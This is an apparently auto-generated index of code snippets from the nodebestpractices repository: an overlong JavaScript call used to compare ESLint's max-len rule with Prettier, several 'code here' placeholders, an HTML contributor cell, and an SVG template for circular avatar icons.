DESCRIPTION: This JavaScript snippet demonstrates a single line function call with multiple arguments that exceeds a typical line length limit. It serves as an example of code that ESLint might flag with a warning (like `max-len`), but wouldn't automatically reformat, contrasting with Prettier's behavior.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/codestylepractices/eslint_prettier.md#_snippet_0

LANGUAGE: JavaScript
CODE:
```
foo(reallyLongArg(), omgSoManyParameters(), IShouldRefactorThis(), isThereSeriouslyAnotherOne(), noWayYouGottaBeKiddingMe());
```

----------------------------------------

TITLE: ESLint Formatting (Before Prettier) - JavaScript
DESCRIPTION: Displays a long function call on a single line, illustrating how ESLint's `max-len` rule might flag it before automatic formatting. This is used to contrast with Prettier's output.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/codestylepractices/eslint_prettier.japanese.md#_snippet_0

LANGUAGE: javascript
CODE:
```
foo(reallyLongArg(), omgSoManyParameters(), IShouldRefactorThis(), isThereSeriouslyAnotherOne(), noWayYouGottaBeKiddingMe());
```

----------------------------------------

TITLE: Illustrating Concept with Javascript Code Example
DESCRIPTION: This snippet provides a generic Javascript code example to illustrate a concept discussed in the preceding text. It serves as a placeholder; specific implementation details are not provided here. No specific dependencies or inputs/outputs are shown.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/bumpversion.md#_snippet_0

LANGUAGE: javascript
CODE:
```
code here
```

----------------------------------------

TITLE: Demonstrating Another Code Example - JavaScript
DESCRIPTION: This snippet presents a second basic JavaScript code example, likely to illustrate a different point or variation. Similar to the previous snippet, 'code here' is a placeholder with no specific functionality, dependencies, or I/O defined.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/template.md#_snippet_1

LANGUAGE: javascript
CODE:
```
code here
```

----------------------------------------

TITLE: Providing Another Example - Javascript
DESCRIPTION: Following the first example, this snippet provides an additional illustration of functionality or an alternative approach in Javascript. It shows how a related concept can be implemented.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/bumpversion.japanese.md#_snippet_1

LANGUAGE: javascript
CODE:
```
code here
```

----------------------------------------

TITLE: Illustrating Concept - Javascript
DESCRIPTION: This snippet serves as a placeholder example demonstrating a concept discussed in the preceding section. It illustrates the basic structure or syntax for implementing the described functionality in Javascript.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/bumpversion.japanese.md#_snippet_0

LANGUAGE: javascript
CODE:
```
code here
```

----------------------------------------

TITLE: Providing Another Javascript Code Example
DESCRIPTION: This snippet offers a second generic Javascript code example, following another explanation. Like the first, it's a placeholder without specific code details, dependencies, or defined inputs/outputs. It demonstrates the structure for presenting multiple code examples.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/testingandquality/bumpversion.md#_snippet_1

LANGUAGE: javascript
CODE:
```
code here
```

----------------------------------------

TITLE: Demonstrating Code Example - JavaScript
DESCRIPTION: This snippet provides a basic code example following an explanation, illustrating a simple concept in JavaScript. The code 'code here' serves as a placeholder; actual functionality is not defined. There are no specific dependencies or I/O implied.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/sections/template.md#_snippet_0

LANGUAGE: javascript
CODE:
```
code here
```

----------------------------------------

TITLE: Rendering Single Contributor Cell HTML
DESCRIPTION: This HTML snippet defines a table data cell (<td>) used to display information for a single project contributor within a larger table structure. It includes an avatar image fetched from GitHub, the contributor's name, a link to their GitHub profile, and a link to their specific contributions mentioned in the document. The cell uses basic styling for centering content and managing image and text display.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/README.japanese.md#_snippet_0

LANGUAGE: HTML
CODE:
```
<td align="center" valign="top" width="14.28%"><a href="https://github.com/uronly14me"><img src="https://avatars2.githubusercontent.com/u/5186814?v=4" width="100px;" alt="Sangbeom Han"style="max-width:100px;min-width:100px;" /><br /><sub style="white-space: nowrap;overflow: hidden;text-overflow: ellipsis;"><b>Sangbeom Han</b></sub></a><br /><a href="#content-uronly14me" title="Content">🖋</a></td>
```

----------------------------------------

TITLE: Generating Circular Bordered Icon SVG
DESCRIPTION: This SVG template defines a 400x400 image that clips a source image into a circle and adds a colored border. Replace `[USERNAME]` with the GitHub username to fetch the avatar and `[BORDER_COLOR]` with a hexadecimal color code (e.g., `#33cd32` or `#0efeff`) to set the border color. The resulting SVG can be exported to PNG.
SOURCE: https://github.com/goldbergyoni/nodebestpractices/blob/master/assets/images/members/create-member-icon.md#_snippet_0

LANGUAGE: SVG
CODE:
```
<svg
  width="400"
  height="400"
  xmlns="http://www.w3.org/2000/svg"
>
  <clipPath id="clipCircle">
    <circle r="200" cx="200" cy="200" />
  </clipPath>
  <image
    clip-path="url(#clipCircle)"
    width="400" height="400"
    href="https://avatars.githubusercontent.com/[USERNAME]">
  </image>
  <circle
    r="197"
    cx="200"
    cy="200"
    stroke="[BORDER_COLOR]"
    stroke-width="6"
    fill="none"
  />
</svg>
```